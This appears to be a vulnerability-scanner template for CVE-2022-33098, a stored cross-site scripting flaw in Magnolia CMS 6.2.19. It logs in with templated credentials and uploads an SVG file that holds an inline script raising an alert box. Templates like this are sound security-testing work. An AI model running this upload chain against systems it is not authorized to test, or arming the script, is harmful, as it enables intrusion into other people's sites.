id: CVE-2022-33098
info:
  author: lucasljm2001,ekrause
  classification:
    cve-id: CVE-2022-33098
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
  description: Detects a XSS vulnerability in Magnolia CMS System
  name: Magnolia CMS 6.2.19 - Stored Cross-Site Scripting (XSS)
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2022-33098
  - https://nexus.magnolia-cms.com/service/local/repositories/magnolia.public.releases/content/info/magnolia/bundle/magnolia-community-demo-webapp/6.2.19/magnolia-community-demo-webapp-6.2.19-tomcat-bundle.zip
  - https://www.exploit-db.com/exploits/50976
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-33098
  severity: medium
  tags: cve,cve2022,xss
requests:
- matchers:
  - status:
    - 200
    type: status
  raw:
  - 'GET /magnoliaAuthor/.magnolia/admincentral HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /magnoliaAuthor/.magnolia/admincentral HTTP/1.1

    Host: {{Hostname}}

    Content-Length: 92

    Cookie: csrf={{csrf}};


    mgnlUserId={{username}}&mgnlUserPSWD={{password}}&csrf={{csrf}}

    '
  - "POST /magnoliaAuthor/.magnolia/admincentral/APP/UPLOAD/0/140/action/cba61868-b27a-4d50-983d-adf48b992be1\
    \ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=---------------------------399178799522967017241464837908\n\
    \n-----------------------------399178799522967017241464837908\nContent-Disposition:\
    \ form-data; name=\"140_file\"; filename=\"xss.svg\"\nContent-Type: image/svg+xml\n\
    \n<?xml version=\"1.0\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD\
    \ SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n\n<svg\
    \ version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n\
    \  <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"\
    #004400\"/>\n  <script type=\"text/javascript\">\n    alert('POC - Magnolia CMS');\n\
    \  </script>\n</svg>\n\n-----------------------------399178799522967017241464837908--\n"
